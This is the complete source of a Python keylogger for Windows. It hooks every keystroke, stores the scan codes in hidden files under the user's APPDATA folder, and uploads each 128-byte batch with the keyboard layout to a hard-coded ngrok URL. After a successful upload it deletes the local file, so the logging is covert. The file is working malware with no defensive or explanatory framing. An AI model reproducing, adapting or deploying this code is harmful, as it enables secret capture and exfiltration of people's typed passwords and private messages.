import keyboard
import requests
import ctypes
import uuid
import os


class Logger:
    MAX_FILE_SIZE = 128
    APPDATA_FOLDER = os.getenv("APPDATA")
    FILE_NAME_PREFIX = "."
    FILE_NAME_SUFFIX = ".sc"
    REMOTE_SERVER = "http://c784-89-11-175-7.eu.ngrok.io/l0gg3r_3ndp0in7"
    REMOTE_HEADERS = {"Content-Type": "application/octet-stream"}

    def __init__(self):
        self.file_path = os.path.join(
            self.APPDATA_FOLDER,
            self.FILE_NAME_PREFIX + str(uuid.uuid4()) + self.FILE_NAME_SUFFIX,
        )
        self.file_size = 0

    def _get_layout(self):
        layout_name = ctypes.create_unicode_buffer(9)
        if ctypes.WinDLL("user32").GetKeyboardLayoutNameW(layout_name):
            return layout_name.value
        return None

    def _write_to_file(self, event):
        with open(self.file_path, "ab") as f:
            try:
                f.write(bytes([event.scan_code]))
            except ValueError:
                pass  # Discard extended scan codes

        self.file_size = os.path.getsize(self.file_path)

        if self.file_size >= self.MAX_FILE_SIZE:
            with open(self.file_path, "rb") as f:
                response = requests.post(
                    self.REMOTE_SERVER,
                    headers=self.REMOTE_HEADERS,
                    params={"layout": self._get_layout()},
                    data=f,
                )

            if response.status_code == 200:
                os.remove(self.file_path)

            self.file_path = os.path.join(
                self.APPDATA_FOLDER,
                self.FILE_NAME_PREFIX + str(uuid.uuid4()) + self.FILE_NAME_SUFFIX,
            )
            self.file_size = 0

    def start_logging(self):
        keyboard.hook(self._write_to_file)
        keyboard.wait()


if __name__ == "__main__":
    keylogger = Logger()
    keylogger.start_logging()
